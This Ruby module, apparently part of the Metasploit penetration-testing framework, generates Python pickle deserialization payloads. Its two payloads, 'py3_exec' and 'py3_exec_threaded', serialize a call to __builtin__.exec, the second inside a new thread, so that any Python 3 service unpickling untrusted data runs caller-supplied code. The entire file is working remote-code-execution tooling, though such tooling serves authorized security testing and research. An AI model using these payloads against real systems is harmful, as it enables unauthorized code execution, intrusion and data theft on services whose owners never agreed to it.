# -*- coding: binary -*-

# Python deserialization Utility
module Msf
  module Util
    # Python deserialization class
    class PythonDeserialization
      # That could be in the future a list of payloads used to exploit the Python deserialization vulnerability.
      # Payload source files are available in external/source/python_deserialization
      PAYLOADS = {
        # this payload will work with Python 3.x targets to execute Python code in place
        py3_exec: proc do |python_code|
          escaped = python_code.gsub(/[\\\n\r]/) { |t| "\\u00#{t.ord.to_s(16).rjust(2, '0')}" }
          %|c__builtin__\nexec\np0\n(V#{escaped}\np1\ntp2\nRp3\n.|
        end,
        # this payload will work with Python 3.x targets to execute Python code in a new thread
        py3_exec_threaded: proc do |python_code|
          escaped = python_code.gsub(/[\\\n\r]/) { |t| "\\u00#{t.ord.to_s(16).rjust(2, '0')}" }
          %|c__builtin__\ngetattr\np0\n(cthreading\nThread\np1\nVstart\np2\ntp3\nRp4\n(g1\n(Nc__builtin__\nexec\np5\nN(V#{escaped}\np6\ntp7\ntp8\nRp9\ntp10\nRp11\n.|
        end
      }

      def self.payload(payload_name, command = nil)

        raise ArgumentError, "#{payload_name} payload not found in payloads" unless payload_names.include? payload_name.to_sym

        PAYLOADS[payload_name.to_sym].call(command)
      end

      def self.payload_names
        PAYLOADS.keys
      end

    end
  end
end
